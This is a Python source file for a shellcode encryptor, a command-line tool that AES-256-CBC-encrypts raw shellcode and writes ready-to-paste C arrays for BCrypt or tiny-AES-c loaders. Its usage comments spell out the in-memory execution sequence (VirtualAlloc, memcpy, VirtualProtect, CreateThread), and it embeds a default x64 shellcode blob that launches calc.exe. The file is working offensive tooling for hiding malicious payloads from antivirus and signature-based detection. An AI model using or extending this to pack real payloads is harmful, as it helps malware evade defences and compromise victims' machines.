
#!/usr/bin/env python3
"""
aes_encryptor.py — AES-CBC Shellcode Encryptor

Usage   :
    python3 aes_encryptor.py -f shellcode.bin
    python3 aes_encryptor.py -s fc4883e4f0...
    python3 aes_encryptor.py -f shellcode.bin -o out.c --format tinyaes -v
    python3 aes_encryptor.py -f shellcode.bin --key <32-byte-hex> --iv <16-byte-hex>
    python3 aes_encryptor.py --list-formats
"""

import os
import sys
import math
import hashlib
import argparse
import textwrap
import struct
from datetime import datetime

# ── dependency check ────────────────────────────────────────────────────────
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[FATAL] pycryptodome not installed.")
    print("        Run: pip install pycryptodome")
    sys.exit(1)

# ── constants ────────────────────────────────────────────────────────────────
KEY_SIZE   = 32   # AES-256
IV_SIZE    = 16   # AES block size / IV size
BLOCK_SIZE = 16

BANNER = r"""
  ___  ___ ____        _____                             _
 / _ \| __/ ___|      | ____|_ __   ___ _ __ _   _ _ __| |_ ___  _ __
| | | | |_\___ \ _____|  _| | '_ \ / __| '__| | | | '_ \ __/ _ \| '__|
| |_| | |_ ___) |_____| |___| | | | (__| |  | |_| | |_) | || (_) | |
 \__\_\____|____/      |_____|_| |_|\___|_|   \__, | .__/ \__\___/|_|
                                               |___/|_|
"""

FORMATS = {
    "bcrypt"  : "BCrypt WinAPI loader (InstallAesEncryption / BCryptDecrypt)",
    "tinyaes" : "tiny-AES-c loader   (AES_CBC_decrypt_buffer)",
    "both"    : "Output arrays for both loaders",
    "raw"     : "Raw binary ciphertext to file (no C arrays)",
    "python"  : "Python bytes literal (for another script)",
}

# ── verbose logger ────────────────────────────────────────────────────────────
class Logger:
    RESET  = "\033[0m"
    BOLD   = "\033[1m"
    RED    = "\033[31m"
    GREEN  = "\033[32m"
    YELLOW = "\033[33m"
    CYAN   = "\033[36m"
    GRAY   = "\033[90m"

    def __init__(self, verbose: bool = False, no_color: bool = False):
        self.verbose  = verbose
        self.no_color = no_color

    def _c(self, code: str, text: str) -> str:
        if self.no_color or not sys.stdout.isatty():
            return text
        return f"{code}{text}{self.RESET}"

    def info(self, msg: str):
        print(self._c(self.CYAN, "[*]") + f" {msg}")

    def ok(self, msg: str):
        print(self._c(self.GREEN, "[+]") + f" {msg}")

    def warn(self, msg: str):
        print(self._c(self.YELLOW, "[!]") + f" {msg}")

    def error(self, msg: str):
        print(self._c(self.RED, "[ERROR]") + f" {msg}", file=sys.stderr)

    def fatal(self, msg: str):
        print(self._c(self.RED, "[FATAL]") + f" {msg}", file=sys.stderr)
        sys.exit(1)

    def debug(self, msg: str):
        if self.verbose:
            print(self._c(self.GRAY, "[DBG]") + f" {msg}")

    def section(self, title: str):
        if self.verbose:
            bar = "─" * (54 - len(title))
            print(self._c(self.BOLD, f"\n── {title} {bar}"))

    def hex_dump(self, label: str, data: bytes, cols: int = 16):
        """Pretty hex dump shown only in verbose mode."""
        if not self.verbose:
            return
        print(self._c(self.GRAY, f"  {label} ({len(data)} bytes):"))
        for i in range(0, min(len(data), cols * 4), cols):   # cap at 4 rows
            chunk = data[i:i+cols]
            hex_part  = " ".join(f"{b:02X}" for b in chunk)
            ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
            print(f"    {i:04X}  {hex_part:<{cols*3}}  {ascii_part}")
        if len(data) > cols * 4:
            print(f"    ... ({len(data) - cols*4} more bytes)")


log = Logger()   # replaced after arg parse


# ── entropy ───────────────────────────────────────────────────────────────────
def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    n = len(data)
    return -sum((c/n) * math.log2(c/n) for c in freq if c)


# ── key / IV helpers ──────────────────────────────────────────────────────────
def generate_random_bytes(size: int) -> bytes:
    """os.urandom — CSPRNG, not rand()."""
    return os.urandom(size)


def parse_hex_key(hex_str: str, expected: int, label: str) -> bytes:
    """Parse a hex string into bytes, with length validation."""
    cleaned = hex_str.strip().replace("0x", "").replace(" ", "").replace(":", "")
    try:
        data = bytes.fromhex(cleaned)
    except ValueError as e:
        log.fatal(f"Invalid hex for {label}: {e}")
    if len(data) != expected:
        log.fatal(f"{label} must be {expected} bytes, got {len(data)}")
    return data


# ── padding (tiny-AES zero-pad style) ────────────────────────────────────────
def zero_pad(data: bytes) -> bytes:
    """Zero-pad to next 16-byte boundary (tiny-AES style, not PKCS7)."""
    rem = len(data) % BLOCK_SIZE
    if rem == 0:
        return data + bytes(BLOCK_SIZE)   # always add a block like tiny-AES does
    return data + bytes(BLOCK_SIZE - rem)


# ── encryption ────────────────────────────────────────────────────────────────
def aes_cbc_encrypt_pkcs7(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    """PKCS7 padded — compatible with BCrypt BCRYPT_BLOCK_PADDING."""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(plaintext, BLOCK_SIZE))


def aes_cbc_encrypt_zeropad(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    """Zero-padded — compatible with tiny-AES-c."""
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = zero_pad(plaintext)
    return cipher.encrypt(padded)


# ── verification (decrypt & compare) ─────────────────────────────────────────
def verify_roundtrip(original: bytes, ciphertext: bytes,
                     key: bytes, iv: bytes, mode: str) -> bool:
    """Decrypt ciphertext and compare to original to confirm correctness."""
    try:
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_padded = cipher.decrypt(ciphertext)
        if mode == "bcrypt":
            decrypted = unpad(decrypted_padded, BLOCK_SIZE)
        else:
            # zero-pad: strip trailing nulls up to original length
            decrypted = decrypted_padded[:len(original)]
        return decrypted == original
    except Exception as e:
        log.debug(f"Roundtrip verify exception: {e}")
        return False


# ── C array formatter ─────────────────────────────────────────────────────────
def to_c_array(name: str, data: bytes, cols: int = 16,
               comment: str = "") -> str:
    lines = []
    if comment:
        lines.append(f"// {comment}")
    lines.append(f"unsigned char {name}[] = {{")
    for i in range(0, len(data), cols):
        chunk = data[i:i+cols]
        hex_bytes = ", ".join(f"0x{b:02X}" for b in chunk)
        lines.append(f"\t{hex_bytes},")
    lines[-1] = lines[-1].rstrip(",") + " "
    lines.append(f"}};\n")
    return "\n".join(lines)


def to_python_bytes(name: str, data: bytes, cols: int = 16) -> str:
    lines = [f"{name} = ("]
    for i in range(0, len(data), cols):
        chunk = data[i:i+cols]
        esc = "".join(f"\\x{b:02x}" for b in chunk)
        lines.append(f'    b"{esc}"')
    lines.append(")")
    return "\n".join(lines)


# ── output builders ───────────────────────────────────────────────────────────
def build_bcrypt_output(key: bytes, iv: bytes, ct: bytes,
                        plaintext_size: int) -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    out = []
    out.append(f"// Generated by aes_encryptor.py — {ts}")
    out.append(f"// Format  : BCrypt WinAPI (AES-256-CBC, PKCS7 padding)")
    out.append(f"// Loader  : InstallAesDecryption / SimpleDecryption")
    out.append(f"// Payload : {plaintext_size} bytes  →  {len(ct)} bytes (ciphertext)")
    out.append(f"// SHA-256 : {hashlib.sha256(ct).hexdigest()}")
    out.append("")
    out.append(f"#define SHELLCODE_SIZE  {plaintext_size}")
    out.append("")
    out.append(to_c_array("pKey", key, comment=f"AES-256 key ({KEY_SIZE} bytes)"))
    out.append(to_c_array("pIv",  iv,  comment=f"IV ({IV_SIZE} bytes)"))
    out.append(to_c_array("CipherText", ct,
               comment=f"Ciphertext ({len(ct)} bytes) — sizeof() exact, no -1 needed"))
    out.append("// Usage:")
    out.append("//   SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &pPlain, &dwSize);")
    out.append("//   VirtualAlloc / memcpy(SHELLCODE_SIZE) / VirtualProtect / CreateThread")
    return "\n".join(out)


def build_tinyaes_output(key: bytes, iv: bytes, ct: bytes,
                         plaintext_size: int) -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    out = []
    out.append(f"// Generated by aes_encryptor.py — {ts}")
    out.append(f"// Format  : tiny-AES-c (AES-256-CBC, zero padding)")
    out.append(f"// Loader  : AES_CBC_decrypt_buffer")
    out.append(f"// Payload : {plaintext_size} bytes  →  {len(ct)} bytes (ciphertext)")
    out.append(f"// SHA-256 : {hashlib.sha256(ct).hexdigest()}")
    out.append("")
    out.append(f"#define SHELLCODE_SIZE  {plaintext_size}")
    out.append("")
    out.append(to_c_array("pKey", key, comment=f"AES-256 key ({KEY_SIZE} bytes)"))
    out.append(to_c_array("pIv",  iv,  comment=f"IV ({IV_SIZE} bytes)"))
    out.append(to_c_array("CipherText", ct,
               comment=f"Ciphertext ({len(ct)} bytes)"))
    out.append("// Usage:")
    out.append("//   struct AES_ctx ctx;")
    out.append("//   AES_init_ctx_iv(&ctx, pKey, pIv);")
    out.append("//   AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));")
    out.append("//   VirtualAlloc / memcpy(SHELLCODE_SIZE) / VirtualProtect / CreateThread")
    return "\n".join(out)


def build_python_output(key: bytes, iv: bytes, ct: bytes,
                        plaintext_size: int) -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    out = []
    out.append(f"# Generated by aes_encryptor.py — {ts}")
    out.append(f"# AES-256-CBC  |  plaintext: {plaintext_size}B  |  ciphertext: {len(ct)}B")
    out.append(f"# SHA-256: {hashlib.sha256(ct).hexdigest()}")
    out.append("")
    out.append(to_python_bytes("KEY", key))
    out.append("")
    out.append(to_python_bytes("IV", iv))
    out.append("")
    out.append(to_python_bytes("CIPHERTEXT", ct))
    out.append("")
    out.append("# Decrypt with:")
    out.append("# from Crypto.Cipher import AES")
    out.append("# from Crypto.Util.Padding import unpad")
    out.append("# cipher = AES.new(KEY, AES.MODE_CBC, IV)")
    out.append("# shellcode = unpad(cipher.decrypt(CIPHERTEXT), 16)")
    return "\n".join(out)


# ── shellcode loader ──────────────────────────────────────────────────────────
def load_shellcode(args) -> bytes:
    if args.file:
        path = args.file
        if not os.path.isfile(path):
            log.fatal(f"File not found: {path}")
        size = os.path.getsize(path)
        if size == 0:
            log.fatal(f"File is empty: {path}")
        if size > 10 * 1024 * 1024:  # 10MB sanity cap
            log.fatal(f"File too large ({size} bytes). Max 10MB.")
        with open(path, "rb") as fh:
            data = fh.read()
        log.ok(f"Loaded from file: '{path}' ({len(data)} bytes)")
        return data

    if args.hex:
        raw = args.hex.strip().replace("\\x", "").replace("0x", "").replace(" ", "").replace(",", "")
        if not all(c in "0123456789abcdefABCDEF" for c in raw):
            log.fatal("Hex string contains invalid characters.")
        if len(raw) % 2 != 0:
            log.fatal("Hex string has odd length — incomplete byte.")
        data = bytes.fromhex(raw)
        if len(data) == 0:
            log.fatal("Hex string decoded to zero bytes.")
        log.ok(f"Loaded from hex string ({len(data)} bytes)")
        return data

    # default built-in calc.exe x64
    log.warn("No input specified — using built-in calc.exe x64 shellcode.")
    return (
        b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        b"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        b"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        b"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        b"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        b"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        b"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        b"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        b"\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
        b"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        b"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
    )


# ── arg parse ─────────────────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        prog="aes_encryptor.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=textwrap.dedent("""\
            AES-256-CBC shellcode encryptor.
            Outputs ready-to-paste C arrays for BCrypt or tiny-AES-c loaders.
        """),
        epilog=textwrap.dedent("""\
            Examples:
              %(prog)s -f shell.bin
              %(prog)s -f shell.bin -o out.c --format tinyaes -v
              %(prog)s -s fc4883e4f0... --format python
              %(prog)s -f shell.bin --key <64-char-hex> --iv <32-char-hex>
              %(prog)s --list-formats
        """),
    )

    # input
    inp = p.add_mutually_exclusive_group()
    inp.add_argument("-f", "--file", metavar="FILE",
                     help="Raw shellcode binary (.bin)")
    inp.add_argument("-s", "--hex",  metavar="HEX",
                     help="Shellcode as hex string (fc4883...)")

    # key material
    p.add_argument("--key", metavar="HEX",
                   help=f"Use a specific AES key ({KEY_SIZE}-byte hex). "
                        f"Default: random.")
    p.add_argument("--iv",  metavar="HEX",
                   help=f"Use a specific IV ({IV_SIZE}-byte hex). "
                        f"Default: random.")

    # output
    p.add_argument("-o", "--output", metavar="FILE",
                   help="Write C arrays to file instead of stdout.")
    p.add_argument("--format", choices=list(FORMATS.keys()),
                   default="bcrypt",
                   help="Output format (default: bcrypt). See --list-formats.")
    p.add_argument("--list-formats", action="store_true",
                   help="List available output formats and exit.")

    # behaviour
    p.add_argument("-v", "--verbose", action="store_true",
                   help="Verbose output: hex dumps, entropy, timing, debug info.")
    p.add_argument("--no-color", action="store_true",
                   help="Disable ANSI colour output.")
    p.add_argument("--no-verify", action="store_true",
                   help="Skip roundtrip decrypt verification.")
    p.add_argument("--no-banner", action="store_true",
                   help="Suppress the ASCII art banner.")

    return p.parse_args()


# ── main ──────────────────────────────────────────────────────────────────────
def main():
    global log

    args = parse_args()

    # init logger
    log = Logger(verbose=args.verbose, no_color=args.no_color)

    # list formats and exit
    if args.list_formats:
        print("\nAvailable output formats:\n")
        for name, desc in FORMATS.items():
            print(f"  {name:<10}  {desc}")
        print()
        sys.exit(0)

    # banner
    if not args.no_banner:
        print(BANNER)

    # ── load shellcode ───────────────────────────────────────────────────────
    log.section("INPUT")
    shellcode = load_shellcode(args)
    plaintext_size = len(shellcode)

    log.debug(f"SHA-256 (plaintext) : {hashlib.sha256(shellcode).hexdigest()}")
    log.debug(f"MD5     (plaintext) : {hashlib.md5(shellcode).hexdigest()}")

    pt_entropy = shannon_entropy(shellcode)
    log.debug(f"Entropy (plaintext) : {pt_entropy:.4f} bits/byte")
    if pt_entropy < 3.0:
        log.warn("Low entropy plaintext — may not be shellcode (ASCII/text?)")

    log.hex_dump("Plaintext (first bytes)", shellcode)

    # ── key / IV ─────────────────────────────────────────────────────────────
    log.section("KEY MATERIAL")

    if args.key:
        key = parse_hex_key(args.key, KEY_SIZE, "--key")
        log.ok(f"Using provided key ({KEY_SIZE} bytes)")
    else:
        key = generate_random_bytes(KEY_SIZE)
        log.ok(f"Generated random key ({KEY_SIZE} bytes)")

    if args.iv:
        iv = parse_hex_key(args.iv, IV_SIZE, "--iv")
        log.ok(f"Using provided IV ({IV_SIZE} bytes)")
    else:
        iv = generate_random_bytes(IV_SIZE)
        log.ok(f"Generated random IV ({IV_SIZE} bytes)")

    log.hex_dump("Key", key)
    log.hex_dump("IV",  iv)

    # ── encrypt ──────────────────────────────────────────────────────────────
    log.section("ENCRYPTION")

    fmt = args.format
    try:
        if fmt in ("bcrypt", "both", "python"):
            ct_bcrypt = aes_cbc_encrypt_pkcs7(shellcode, key, iv)
            log.ok(f"BCrypt  (PKCS7): {plaintext_size}B → {len(ct_bcrypt)}B "
                   f"(+{len(ct_bcrypt)-plaintext_size}B padding)")
        if fmt in ("tinyaes", "both"):
            ct_tiny = aes_cbc_encrypt_zeropad(shellcode, key, iv)
            log.ok(f"tiny-AES (zero): {plaintext_size}B → {len(ct_tiny)}B "
                   f"(+{len(ct_tiny)-plaintext_size}B padding)")
        if fmt == "raw":
            ct_bcrypt = aes_cbc_encrypt_pkcs7(shellcode, key, iv)
    except Exception as e:
        log.fatal(f"Encryption failed: {e}")

    # pick primary ciphertext for stats
    ct_primary = ct_bcrypt if fmt != "tinyaes" else ct_tiny

    ct_entropy = shannon_entropy(ct_primary)
    log.debug(f"Entropy (ciphertext): {ct_entropy:.4f} bits/byte")
    log.debug(f"SHA-256 (ciphertext): {hashlib.sha256(ct_primary).hexdigest()}")

    if ct_entropy < 7.0:
        log.warn(f"Ciphertext entropy {ct_entropy:.2f} is low — verify encryption is correct.")

    log.hex_dump("Ciphertext (first bytes)", ct_primary)

    # ── verify roundtrip ─────────────────────────────────────────────────────
    log.section("VERIFICATION")
    if not args.no_verify:
        if fmt in ("bcrypt", "both", "python", "raw"):
            ok = verify_roundtrip(shellcode, ct_bcrypt, key, iv, "bcrypt")
            if ok:
                log.ok("Roundtrip verify PASSED (BCrypt/PKCS7)")
            else:
                log.warn("Roundtrip verify FAILED (BCrypt/PKCS7) — output may be wrong!")
        if fmt in ("tinyaes", "both"):
            ok = verify_roundtrip(shellcode, ct_tiny, key, iv, "tinyaes")
            if ok:
                log.ok("Roundtrip verify PASSED (tiny-AES/zero-pad)")
            else:
                log.warn("Roundtrip verify FAILED (tiny-AES/zero-pad)")
    else:
        log.warn("Roundtrip verification skipped (--no-verify)")

    # ── build output ─────────────────────────────────────────────────────────
    log.section("OUTPUT")

    if fmt == "raw":
        out_path = args.output or "shellcode_enc.bin"
        with open(out_path, "wb") as fh:
            fh.write(ct_bcrypt)
        log.ok(f"Raw ciphertext written to: {out_path} ({len(ct_bcrypt)} bytes)")
        # also write key and IV to a companion .txt
        kv_path = out_path + ".keymeta"
        with open(kv_path, "w") as fh:
            fh.write(f"KEY={key.hex()}\n")
            fh.write(f"IV={iv.hex()}\n")
            fh.write(f"PLAINTEXT_SIZE={plaintext_size}\n")
        log.ok(f"Key/IV metadata written to: {kv_path}")
        _print_summary(key, iv, ct_bcrypt, plaintext_size)
        return

    # text formats
    if fmt == "bcrypt":
        output_text = build_bcrypt_output(key, iv, ct_bcrypt, plaintext_size)
    elif fmt == "tinyaes":
        output_text = build_tinyaes_output(key, iv, ct_tiny, plaintext_size)
    elif fmt == "both":
        output_text  = "// ══ BCrypt (PKCS7) ══\n"
        output_text += build_bcrypt_output(key, iv, ct_bcrypt, plaintext_size)
        output_text += "\n\n// ══ tiny-AES-c (zero-pad) ══\n"
        output_text += build_tinyaes_output(key, iv, ct_tiny, plaintext_size)
    elif fmt == "python":
        output_text = build_python_output(key, iv, ct_bcrypt, plaintext_size)

    if args.output:
        try:
            with open(args.output, "w") as fh:
                fh.write(output_text)
            log.ok(f"Output written to: {args.output}")
        except OSError as e:
            log.fatal(f"Could not write to '{args.output}': {e}")
    else:
        sep = "=" * 60
        print(f"\n{sep}")
        print("// Paste the following into your loader:")
        print(f"{sep}\n")
        print(output_text)

    _print_summary(key, iv, ct_primary, plaintext_size)


def _print_summary(key, iv, ct, plaintext_size):
    """Always-printed final summary block."""
    print()
    print("─" * 60)
    print(f"  Plaintext size  : {plaintext_size} bytes")
    print(f"  Ciphertext size : {len(ct)} bytes")
    print(f"  Padding added   : {len(ct) - plaintext_size} bytes")
    print(f"  Key  (hex)      : {key.hex()}")
    print(f"  IV   (hex)      : {iv.hex()}")
    print(f"  CT SHA-256      : {hashlib.sha256(ct).hexdigest()[:32]}...")
    print(f"  CT entropy      : {shannon_entropy(ct):.4f} bits/byte")
    print("─" * 60)


if __name__ == "__main__":
    main()
